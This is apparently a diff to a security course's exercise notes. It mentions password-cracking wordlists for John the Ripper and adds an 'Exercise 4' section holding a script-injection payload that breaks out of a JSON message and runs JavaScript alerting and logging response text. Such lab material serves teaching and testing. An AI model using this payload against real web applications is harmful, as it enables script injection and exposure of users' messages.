@@ -95,6 +95,11 @@ Exercise 2
   	- usernames.txt: a list of all the usernames for cracking
   	- john.txt: john the ripper password dictionary
 TODO: do write up
+
+Exercise 4
+===========
+// Evil attack code message
+", "from": "blah", "subject": "Blah"} //END_MSG// 1;})(); window.alert("Evil!"); console.log(this.responseText); (function() { return {"date": "Sat Oct 24 23:41:40 2015", "body": "I had a great time at your party, but I must admit that I have hidden your magician's hat. Orange Julius told me to do it!", "from": "Drake", "subject": "You better respond!"} //END_MSG// {"date": "Evil", "body": "Evil", "from": "Evil", "subject": "Evil
 	
 
 
